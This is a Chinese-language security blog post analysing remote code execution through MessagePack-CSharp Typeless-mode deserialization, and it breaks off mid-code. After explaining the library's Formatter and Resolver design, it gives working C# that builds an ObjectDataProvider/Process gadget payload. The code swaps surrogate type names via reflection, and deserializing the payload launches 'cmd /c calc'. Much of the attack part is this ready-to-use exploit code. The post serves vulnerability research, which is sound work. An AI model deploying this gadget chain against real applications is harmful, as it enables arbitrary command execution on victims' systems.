---
title: MessagePack-CSharp Typeless Mode Deserialization RCE
url: https://y4er.com/posts/messagepack-csharp-typeless-mode-deserialization-rce/
source: Y4er的博客
date: 2023-04-25
fetch_date: 2025-10-04T11:31:29.907753
---

# MessagePack-CSharp Typeless Mode Deserialization RCE

[Y4er的博客](/ "Y4er的博客")

[归档](/posts/) [专栏](/series/) [分类](/categories/) [标签](/tags/) [笔记](/note/) [朋友](/friends/) [作品](/showcase/)

浅色深色跟随系统

[Y4er的博客](/ "Y4er的博客")

取消

[归档](/posts/)[专栏](/series/)[分类](/categories/)[标签](/tags/)[笔记](/note/)[朋友](/friends/)[作品](/showcase/)

浅色深色跟随系统

## 目录

* [MessagePack架构](#messagepack架构)
* [序列化过程](#序列化过程)
* [反序列化](#反序列化)
* [版本问题](#版本问题)
* [总结](#总结)
* [参考](#参考)

## 目录

* [MessagePack架构](#messagepack架构)
* [序列化过程](#序列化过程)
* [反序列化](#反序列化)
* [版本问题](#版本问题)
* [总结](#总结)
* [参考](#参考)

# MessagePack-CSharp Typeless Mode Deserialization RCE

![Y4er avatar](/img/avatar.jpg)[Y4er](https://github.com/Y4er "Author")
 收录于  类别 [代码审计](/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/)

2023-04-24  2023-04-24  约 5387 字
 预计阅读 24 分钟

目录

* [MessagePack架构](#messagepack架构)
* [序列化过程](#序列化过程)
* [反序列化](#反序列化)
* [版本问题](#版本问题)
* [总结](#总结)
* [参考](#参考)

警告

本文最后更新于 2023-04-24，文中内容可能已过时。

这篇文章给了简单的讲解和利用方式：
<https://blog.netwrix.com/2023/04/10/generating-deserialization-payloads-for-messagepack-cs-typeless-mode/>

我将对其进行补充。

# # MessagePack架构

按照我的理解，MessagePack有三大对象

1. Formatter
2. Resolver
3. FormatterCache

Formatter实现IMessagePackFormatter接口分别拥有Serialize和Deserialize能力

csharp

```
public interface IMessagePackFormatter
{
}

public interface IMessagePackFormatter<T> : IMessagePackFormatter
{
    void Serialize(ref MessagePackWriter writer, T value, MessagePackSerializerOptions options);
    T Deserialize(ref MessagePackReader reader, MessagePackSerializerOptions options);
}
```

Resolver实现IFormatterResolver接口

csharp

```
public interface IFormatterResolver
{
    IMessagePackFormatter<T>? GetFormatter<T>();
}
```

Resolver通过GetFormatter函数获取自身Formatter将两者关联起来。而基本上每个Resolver中都会有一个静态私有FormatterCache类，通过单例模式返回Resolver所拥有的Formatter

形如

csharp

```
using MessagePack.Formatters;

namespace MessagePack.Resolvers
{
    public sealed class PrimitiveObjectResolver : IFormatterResolver
    {
        public static readonly PrimitiveObjectResolver Instance;

        public static readonly MessagePackSerializerOptions Options;

        static PrimitiveObjectResolver()
        {
            Instance = new PrimitiveObjectResolver();
            Options = new MessagePackSerializerOptions(Instance);
        }

        private PrimitiveObjectResolver()
        {
        }

        public IMessagePackFormatter<T>? GetFormatter<T>()
        {
            return FormatterCache<T>.Formatter;
        }

        private static class FormatterCache<T>
        {
            public static readonly IMessagePackFormatter<T>? Formatter;

            static FormatterCache()
            {
                Formatter = (typeof(T) == typeof(object))
                    ? (IMessagePackFormatter<T>)(object)PrimitiveObjectFormatter.Instance
                    : null;
            }
        }
    }
}
```

MessagePack-CSharp库对于动态类型的处理采用的是Typeless模式，对应的Resolver是TypelessContractlessStandardResolver

序列化和反序列化代码如下

csharp

```
MessagePackSerializerOptions options = pUseLz4
    ? TypelessContractlessStandardResolver.Options.WithCompression(MessagePackCompression.Lz4BlockArray)
    : TypelessContractlessStandardResolver.Options;

var bytes = MessagePackSerializer.Serialize(odpInstance, options);
MessagePackSerializer.Deserialize<object>(bytes,options);
```

TypelessContractlessStandardResolver其实包含了多个Resolver

csharp

```
private static readonly IReadOnlyList<IFormatterResolver> Resolvers = new IFormatterResolver[]
{
    NativeDateTimeResolver.Instance,
    ForceSizePrimitiveObjectResolver.Instance,
    BuiltinResolver.Instance,
    AttributeFormatterResolver.Instance,
    DynamicEnumResolver.Instance,
    DynamicGenericResolver.Instance,
    DynamicUnionResolver.Instance,
    DynamicObjectResolver.Instance,
    DynamicContractlessObjectResolverAllowPrivate.Instance,
    TypelessObjectResolver.Instance
};
```

GetFormatter时会遍历这些Resolver，取得对应的解析器处理对应的类型。

# # 序列化过程

接下来的调试以弹计算器为例调试，代码如下

csharp

```
using MessagePack;
using MessagePack.Resolvers;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Linq.Expressions;
using System.Text;
using System.Threading.Tasks;

namespace ConsoleApp1
{
    internal class Program
    {
        static void Main(string[] args)
        {

            MessagePackSerializerOptions options = TypelessContractlessStandardResolver.Options
                                                    .WithAllowAssemblyVersionMismatch(true)
                                                    .WithSecurity(MessagePackSecurity.UntrustedData);

            byte[] bytes = MessagePackHelper.CreateObjectDataProviderGadget("cmd", "/c calc", false);

            MessagePackSerializer.Deserialize<object>(bytes,options);

            Console.ReadKey();

        }
    }
}
```

csharp

```
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Reflection;
using MessagePack;
using MessagePack.Formatters;
using MessagePack.Resolvers;
namespace ConsoleApp1
{
    internal class MessagePackHelper
    {
        internal static byte[] CreateObjectDataProviderGadget(string pCmdFileName, string pCmdArguments, bool pUseLz4)
        {
            SwapTypeCacheNames(
                new Dictionary<Type, string>
                {
                    {
                        typeof(ObjectDataProviderSurrogate),
                        "System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35"
                    },
                    {
                        typeof(ProcessSurrogate),
                        "System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"
                    },
                    {
                        typeof(ProcessStartInfoSurrogate),
                        "System.Diagnostics.ProcessStartInfo, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"
                    }
                });

            var odpInstance = CreateObjectDataProviderSurrogateInstance(pCmdFileName, pCmdArguments);

            MessagePackSerializerOptions options = pUseLz4
                ? TypelessContractlessStandardResolver.Options.WithCompression(MessagePackCompression.Lz4BlockArray)
                : TypelessContractlessStandardResolver.Options;

            return MessagePackSerializer.Serialize(odpInstance, options);
        }

        /// <summary>
        /// Tests the deserialization of a serialized object.
        /// </summary>
        /// <param name="pSerializedData">The serialized data.</param>
        /// <param name="pUseLz4">Flag to use Lz4 compression. This works with both Lz4Block and Lz4BlockArray.</param>
        internal static void Test(byte[] pSerializedData, bool pUseLz4)
        {
            MessagePackSerializerOptions options = pUseLz4
                ? TypelessContractlessStandardResolver.Options.WithCompression(MessagePackCompression.Lz4BlockArray)
                : TypelessContractlessStandardResolver.Options;

            MessagePackSerializer.Deserialize<object>(pSerializedData, options);
        }

        /// <summary>
        /// Utilizes reflection to add values to the internal FullTypeNameCache that MessagePack uses to acquire cached type names for serialization.
        /// This allows us to swap our surrogate ObjectDataProvider gadget type information with the real gadget AQNs when serialized.
        /// </summary>
        /// <param name="pNewTypeCacheEntries">
        /// The dictionary of type name cache entries to swap.
        ///     Key = The type that the serializer has found.
        ///     Value = The real gadget type AQN string which we want to use instead of the surrogate type AQN.
        /// </param>
        private static void SwapTypeCacheNames(IDictionary<Type, string> pNewTypeCacheEntries)
        {
            FieldInfo typeNameCacheField = typeof(TypelessFormatter).GetField("Ful...